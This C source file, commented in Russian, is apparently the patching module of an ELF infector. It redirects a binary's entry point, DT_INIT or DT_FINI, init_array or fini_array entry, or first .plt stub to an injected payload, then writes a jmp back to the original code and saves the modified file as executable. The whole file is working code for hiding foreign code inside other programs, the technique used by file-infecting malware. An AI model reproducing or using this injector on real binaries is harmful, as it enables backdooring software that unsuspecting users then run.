#include "common.h"

void get_shoff(const unsigned char *const, struct File_info *const, const unsigned char *const);
void inject_jmp(uint32_t *, unsigned char *const, const struct File_info *const); 
void patch_rela_dyn(unsigned char *const, const struct File_info *const);
void save_file(const unsigned char *const, const size_t *const, const struct File_info *const, const unsigned char *const);

// Функция изменения адреса точки входа
// IN *new_data - адрес копии файла
// IN *file_size - адрес размера файла
// IN *fi - адрес структуры, что описывает файл
void fm_e_entry(unsigned char *const new_data, const size_t *const file_size, const struct File_info *const fi) {
    uint32_t jmp_value;
    unsigned char *m_name = "e_entry";

    if (fi->ei_class == 0x01) {
        if (fi->pic) {
            jmp_value = fi->fi32.e_entry - (fi->fi32.offset_free + fi->payload_size + 0x05); 
            *(uint32_t *)(new_data + 0x18) = fi->fi32.offset_free;                  // Изменяем адрес точки входа   
        } else {
            jmp_value = fi->fi32.e_entry - fi->fi32.file_vaddr - (fi->fi32.offset_free + fi->payload_size + 0x05); 
            *(uint32_t *)(new_data + 0x18) = fi->fi32.file_vaddr + fi->fi32.offset_free;                  // Изменяем адрес точки входа   
        }
        
        inject_jmp(&jmp_value, new_data + fi->fi32.offset_free + fi->payload_size, fi);

    } else {
        if (fi->pic) {
            jmp_value = fi->fi64.e_entry - (fi->fi64.offset_free + fi->payload_size + 0x05);
            *(uint64_t *)(new_data + 0x18) = fi->fi64.offset_free;
        } else {
            jmp_value = fi->fi64.e_entry - fi->fi64.file_vaddr - (fi->fi64.offset_free + fi->payload_size + 0x05);
            *(uint64_t *)(new_data + 0x18) = fi->fi64.file_vaddr + fi->fi64.offset_free;
        }
        
        inject_jmp(&jmp_value, new_data + fi->fi64.offset_free + fi->payload_size, fi);
    }

    save_file(new_data, file_size, fi, m_name);
}

// Функция изменения адреса init и fini в dynamic
// IN *new_data - адрес копии файла
// IN *file_size - адрес размера файла
// IN *fi - адрес структуры, что описывает файл
// IN p_method - метод патчинга (0x0c - .init, 0x0d - .fini)
void fm_init_fini(unsigned char *const new_data, const size_t *const file_size, struct File_info *const fi, uint8_t p_method) {
    if (!fi->pic) {
        printf("  [!] Данный метод не доступен\n");
        return;
    }

    uint32_t jmp_value;
    unsigned char *mi_name = "init";
    unsigned char *mf_name = "fini";
    unsigned char sh_name_d[] = {0x02, 0x2e, 0x64, 0x79, 0x6E, 0x61, 0x6D, 0x69, 0x63, 0x00};      // .dynamic

    // Взаимодействие с секцией .dynamic
    get_shoff(new_data, fi, sh_name_d);

    // Если секции нет в файле
    if (fi->ei_class == 0x01 && fi->fi32.need_sh_offset == -1 || fi->ei_class == 0x02 && fi->fi64.need_sh_offset == -1) {
        printf("  [-] Инъекция не удалась\n");
        return;
    }

    int i = 0;
    if (fi->ei_class == 0x01) {
        while (i * 0x08 < fi->fi32.need_sh_size)
        {
            if(*(uint32_t *)(new_data + fi->fi32.need_sh_offset + i * 0x08) == p_method) 
            {
                // Значение init или fini в .dynamic - адрес конеца полезной нагрузки с учетом размера инструкции jmp
                jmp_value = *(uint32_t *)(new_data + fi->fi32.need_sh_offset + i * 0x08 + 0x04) - (fi->fi32.offset_free + fi->payload_size + 0x05);
                // Заменяем значения init или fini
                *(uint32_t *)(new_data + fi->fi32.need_sh_offset + i * 0x08 + 0x04) = fi->fi32.offset_free;
                break;
            }

            i++;
        }
    
        inject_jmp(&jmp_value, new_data + fi->fi32.offset_free + fi->payload_size, fi);
    
    } else {
        while (i * 0x10 < fi->fi64.need_sh_size)
        {
            if(*(uint64_t *)(new_data + fi->fi64.need_sh_offset + i * 0x10) == p_method) 
            {
                // Значение init или fini в .dynamic - адрес конеца полезной нагрузки с учетом размера инструкции jmp
                jmp_value = *(uint64_t *)(new_data + fi->fi64.need_sh_offset + i * 0x10 + 0x08) - (fi->fi64.offset_free + fi->payload_size + 0x05);
                // Заменяем значения init или fini
                *(uint64_t *)(new_data + fi->fi64.need_sh_offset + i * 0x10 + 0x08) = fi->fi64.offset_free;
                break;
            }

            i++;
        }

        inject_jmp(&jmp_value, new_data + fi->fi64.offset_free + fi->payload_size, fi);

    } 

    if (p_method == 0x0c) {
        save_file(new_data, file_size, fi, mi_name);
    } else {
        save_file(new_data, file_size, fi, mf_name);
    }
}

// Функция изменения первого адреса в init_array и fini_array
// IN *new_data - адрес копии файла
// IN *file_size - адрес размера файла
// IN *fi - адрес структуры, что описывает файл
// IN p_method - метод патчинга (0 - .init_array, 1 - .fini_array)
void fm_init_fini_array(unsigned char *const new_data, const size_t *const file_size, struct File_info *const fi, bool p_method) {
    uint32_t jmp_value;
    unsigned char *mia_name = "init_array";
    unsigned char *mfa_name = "fini_array";
    unsigned char sh_name_ia[] = {0x01, 0x2e, 0x69, 0x6e, 0x69, 0x74, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x00};        // .init_array
    unsigned char sh_name_fa[] = {0x01, 0x2e, 0x66, 0x69, 0x6e, 0x69, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x00};        // .fini_array
    unsigned char sh_name_rd[] = {0x02, 0x2E, 0x72, 0x65, 0x6C, 0x61, 0x2E, 0x64, 0x79, 0x6E, 0x00};                    // .rela.dyn

    // Взаимодействие с секцией .init_array
    if (!p_method) {
        get_shoff(new_data, fi, sh_name_ia);
    } else {
        get_shoff(new_data, fi, sh_name_fa);
    }
    
    // Если секции нет в файле
    if (fi->ei_class == 0x01 && fi->fi32.need_sh_offset == -1 || fi->ei_class == 0x02 && fi->fi64.need_sh_offset == -1) {
        printf("  [-] Инъекция не удалась\n");
        return;
    }

    if (fi->ei_class == 0x01) {
        if (fi->pic) {
            // Значение первого элемента массива init_array - адрес конеца полезной нагрузки с учетом размера инструкции jmp
            jmp_value = *(uint32_t *)(new_data + fi->fi32.need_sh_offset) - (fi->fi32.offset_free + fi->payload_size + 0x05);
            // Заменяем первый элемент массива 
            *(uint32_t *)(new_data + fi->fi32.need_sh_offset) = fi->fi32.offset_free;
        } else {
            // Значение первого элемента массива init_array - адрес конеца полезной нагрузки с учетом размера инструкции jmp
            jmp_value = *(uint32_t *)(new_data + fi->fi32.need_sh_offset) - fi->fi32.file_vaddr - (fi->fi32.offset_free + fi->payload_size + 0x05);
            // Заменяем первый элемент массива 
            *(uint32_t *)(new_data + fi->fi32.need_sh_offset) = fi->fi32.file_vaddr + fi->fi32.offset_free;
        }
        
        inject_jmp(&jmp_value, new_data + fi->fi32.offset_free + fi->payload_size, fi);

    } else {
        if (fi->pic) {
            // Значение первого элемента массива init_array - адрес конеца полезной нагрузки с учетом размера инструкции jmp
            jmp_value = *(uint64_t *)(new_data + fi->fi64.need_sh_offset) - (fi->fi64.offset_free + fi->payload_size + 0x05);
            // Заменяем первый элемент массива 
            *(uint64_t *)(new_data + fi->fi64.need_sh_offset) = fi->fi64.offset_free;
        } else {
            // Значение первого элемента массива init_array - адрес конеца полезной нагрузки с учетом размера инструкции jmp
            jmp_value = *(uint64_t *)(new_data + fi->fi64.need_sh_offset) - fi->fi64.file_vaddr - (fi->fi64.offset_free + fi->payload_size + 0x05);
            // Заменяем первый элемент массива 
            *(uint64_t *)(new_data + fi->fi64.need_sh_offset) = fi->fi64.file_vaddr + fi->fi64.offset_free;
        }
        

        inject_jmp(&jmp_value, new_data + fi->fi64.offset_free + fi->payload_size, fi);
    }  

    if (fi->pic){
        // Взаимодействие с секцией .rela.dyn
        get_shoff(new_data, fi, sh_name_rd);
        // Если секция есть в файле
        if (fi->ei_class == 0x01 && fi->fi32.need_sh_offset != -1 || fi->ei_class == 0x02 && fi->fi64.need_sh_offset != -1) {
            patch_rela_dyn(new_data, fi);
        }
    }

    if (!p_method) {
        save_file(new_data, file_size, fi, mia_name);
    } else {
        save_file(new_data, file_size, fi, mfa_name);
    }
}

// Функция изменения первой записи в секции .plt
// IN *new_data - адрес копии файла
// IN *file_size - адрес размера файла
// IN *fi - адрес структуры, что описывает файл
void fm_plt(unsigned char *const new_data, const size_t *const file_size, struct File_info *const fi) {
    if (!fi->pic) {
        printf("  [!] Данный метод не доступен\n");
        return;
    }

    uint32_t jmp_value;
    unsigned char *mp_name = "plt";
    unsigned char sh_name_p[] = {0x00, 0x2e, 0x70, 0x6c, 0x74, 0x00};        // .plt

    // Взаимодействие с секцией .plt
    get_shoff(new_data, fi, sh_name_p);

    // Если секции нет в файле
    if (fi->ei_class == 0x01 && fi->fi32.need_sh_offset == -1 || fi->ei_class == 0x02 && fi->fi64.need_sh_offset == -1) {
        printf("  [-] Инъекция не удалась\n");
        return;
    }

    if (fi->ei_class == 0x01) {
        fi->fi32.need_sh_offset += 0x10;

        // Значение адреса начала полезной нагрузки - адрес конца инструкции jmp которую вставим в .plt
        jmp_value = fi->fi32.offset_free - (fi->fi32.need_sh_offset + 0x05);
        // Вместо оригинальной инструкции jmp в .plt вставляем jmp на нагрузку 
        inject_jmp(&jmp_value, new_data + fi->fi32.need_sh_offset, fi);

        // Значение адреса начала инструкции push в .plt - адрес конца полезной нагрузки - 0х05
        jmp_value = fi->fi32.need_sh_offset + 0x06 - (fi->fi32.offset_free + fi->payload_size + 0x05);
        // Вставляем инструкцию jmp в конец нагрузки
        inject_jmp(&jmp_value, new_data + fi->fi32.offset_free + fi->payload_size, fi);


    } else {
        fi->fi64.need_sh_offset += 0x10;

        // Значение адреса начала полезной нагрузки - адрес конца инструкции jmp которую вставим в .plt
        jmp_value = fi->fi64.offset_free - (fi->fi64.need_sh_offset + 0x05);
        // Вместо оригинальной инструкции jmp в .plt вставляем jmp на нагрузку 
        inject_jmp(&jmp_value, new_data + fi->fi64.need_sh_offset, fi);

        // Значение адреса начала инструкции push в .plt - адрес конца полезной нагрузки - 0х05
        jmp_value = fi->fi64.need_sh_offset + 0x06 - (fi->fi64.offset_free + fi->payload_size + 0x05);
        // Вставляем инструкцию jmp в конец нагрузки
        inject_jmp(&jmp_value, new_data + fi->fi64.offset_free + fi->payload_size, fi);
    }  

    save_file(new_data, file_size, fi, mp_name);
}

// Функция поиска индекса
// IN *shstrtab - адрес секции .shstrtab
// IN shstrtab_sz - размер секции .shstrtab
// IN *sh_name - адрес строки (названия секции)
// IN sh_name_sz - размер строки
int find_str_index(const unsigned char *shstrtab, size_t shstrtab_sz, 
                   const unsigned char *sh_name, size_t sh_name_sz) {
    
    if (sh_name == 0 || shstrtab_sz < sh_name_sz) {
        return -1;
    }

    for (size_t i = 0; i <= shstrtab_sz - sh_name_sz; i++) {
        // Проверяем, совпадает ли текущий участок массива с подмассивом
        size_t j;
        for (j = 0; j < sh_name_sz; j++) {
            if (shstrtab[i + j] != sh_name[j]) {
                break;
            }
        }

        if (j == sh_name_sz) {
            return i;
        }
    }

    return -1;
}

// Функция патчинга секции .rela.dyn
// IN/OUT *data - адрес файла в памяти
// IN *fi - адрес структуры
void patch_rela_dyn(unsigned char *const data, const struct File_info *const fi) {
    int i = 0;

    if (fi->ei_class == 0x01) {
        while (i * 0x0c < fi->fi32.need_sh_size) {
            if (*(uint64_t *)(data + fi->fi32.need_sh_offset + i * 0x0c) == fi->fi32.need_sh_addr) {
                *(uint64_t *)(data + fi->fi32.need_sh_offset + i * 0x0c + 0x08) = fi->fi32.offset_free;
            }

            i++;
        }

    } else {
        while (i * 0x18 < fi->fi64.need_sh_size) {
            if (*(uint64_t *)(data + fi->fi64.need_sh_offset + i * 0x18) == fi->fi64.need_sh_addr) {
                *(uint64_t *)(data + fi->fi64.need_sh_offset + i * 0x18 + 0x10) = fi->fi64.offset_free;
            }

            i++;
        }
    }
}

// Функция поиска необходимого секционного заголовка
// IN *data - адрес файла в памяти
// IN/OUT *fi - адрес структуры
// IN *sh_name - адрес строки названия секции
void get_shoff(const unsigned char *const data, struct File_info *const fi, const unsigned char *const sh_name) {
    
    if (fi->ei_class == 0x01) {
        uint32_t shstroff = (uint32_t)(fi->fi32.e_shoff + fi->e_shstrndx * fi->e_shentsize);                            // RAW смещение секционного заголовка
        uint32_t shstr_offset = *(uint32_t *)(data + shstroff + 0x10);                                                  // RAW смещение секции .shstrtab
        uint32_t shstr_size = *(uint32_t *)(data + shstroff + 0x14);                                                    // Размер секции .shstrtab

        int sh_name_index = find_str_index((data + shstr_offset), shstr_size, sh_name + 1, strlen(sh_name + 1) + 1);    // Значение индекса названия искомой секции

        fi->fi32.need_sh_offset = (uint32_t)-1;

        if (sh_name_index == -1) {
            return;
        }
        
        // Получение RAW смещения искомой секции
        for (int i = 0; i < fi->e_shnum; i++) {
            if (*(uint32_t *)(data + fi->fi32.e_shoff + fi->e_shentsize * i) == sh_name_index) {
                // 0x00 - нужен только sh_offset
                // 0х01 - 0x00 + нужен sh_addr секции
                // 0x02 - 0x00 + нужен sh_size секции

                fi->fi32.need_sh_offset = *(uint32_t *)(data + fi->fi32.e_shoff + fi->e_shentsize * i + 0x10);          // RAW смещение секции

                if (sh_name[0] == 0x01) {
                    fi->fi32.need_sh_addr = *(uint32_t *)(data + fi->fi32.e_shoff + fi->e_shentsize * i + 0x0c);        // RAW адрес секции
                
                } else if (sh_name[0] == 0x02) {
                    fi->fi32.need_sh_size = *(uint32_t *)(data + fi->fi32.e_shoff + fi->e_shentsize * i + 0x14);        // Размер секции
                }
                return;
            }         
        }

    } else {
        uint64_t shstroff = (uint64_t)(fi->fi64.e_shoff + fi->e_shstrndx * fi->e_shentsize);                            // RAW смещение заголовка секции .shstrtab
        uint64_t shstr_offset = *(uint64_t *)(data + shstroff + 0x18);                                                  // RAW смещение секции .shstrtab
        uint64_t shstr_size = *(uint64_t *)(data + shstroff + 0x20);                                                    // Размер секции .shstrtab
        
        int sh_name_index = find_str_index((data + shstr_offset), shstr_size, sh_name + 1, strlen(sh_name + 1) + 1);    // Значение индекса названия искомой секции
        
        fi->fi64.need_sh_offset = (uint64_t)-1;

        if (sh_name_index == -1) {
            return;
        }
        
        // Получение RAW смещения искомой секции
        for (int i = 0; i < fi->e_shnum; i++) {
            if (*(uint32_t *)(data + fi->fi64.e_shoff + fi->e_shentsize * i) == sh_name_index) {
                fi->fi64.need_sh_offset = *(uint64_t *)(data + fi->fi64.e_shoff + fi->e_shentsize * i + 0x18);          // RAW смещение секции

                if (sh_name[0] == 0x01) {
                    fi->fi64.need_sh_addr = *(uint64_t *)(data + fi->fi64.e_shoff + fi->e_shentsize * i + 0x10);        // RAW адрес секции
                
                } else if (sh_name[0] == 0x02) {
                    fi->fi64.need_sh_size = *(uint64_t *)(data + fi->fi64.e_shoff + fi->e_shentsize * i + 0x20);        // Размер секции
                }
                return;
            }         
        }
    }
}

// Функция вставки перехода на изанчальный адрес и сохранение файла
// IN *jmp_value - адрес строки байт (разница адрес)
// IN *inject_addr - адрес вставки инструкции jmp
// IN *fi - адрес структуры 
void inject_jmp(uint32_t *jmp_value, unsigned char *const inject_addr, const struct File_info *const fi) {
    uint8_t jmp[5] = {0xe9};

    // Генерация инструкции jmp
    jmp[1] = *jmp_value & 0xff;
    jmp[2] = (*jmp_value >> 8) & 0xff;
    jmp[3] = (*jmp_value >> 16) & 0xff;
    jmp[4] = (*jmp_value >> 24) & 0xff;

    memcpy((uint8_t *)(inject_addr), jmp, sizeof(jmp));             // Вставка инструкции

    printf("  [+] Инъекция прошла успешно\n");
}

// Функция сохранения измененного файла
// IN *new_data - адрес данных для сохранения 
// IN *file_size - адрес размера данных
// IN *fi - адрес структуры
// IN *m_name - адрес добавочной строки для названия файла
void save_file(const unsigned char *const new_data, const size_t *const file_size, const struct File_info *const fi, const unsigned char *const m_name) {
    // Генерация имени файла
    char output_file_name[256];
    snprintf(output_file_name, sizeof(output_file_name), "%s/%s_%s", fi->file_dir, fi->file_path, m_name);

    // Создание файла с правами на исполнение
    int fd = open(output_file_name, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd == -1) {
        perror("  [!] Ошибка создания файла");
        return;
    }

    // Запись данных в файл
    size_t bytes_written = write(fd, new_data, *file_size);
    if (bytes_written == -1 || (size_t)bytes_written != *file_size) {
        perror("  [!] Ошибка записи в файл");
    } else {
        printf("  [+] Файл создан: %s\n", output_file_name);
    }

    // Закрытие файла
    close(fd);
}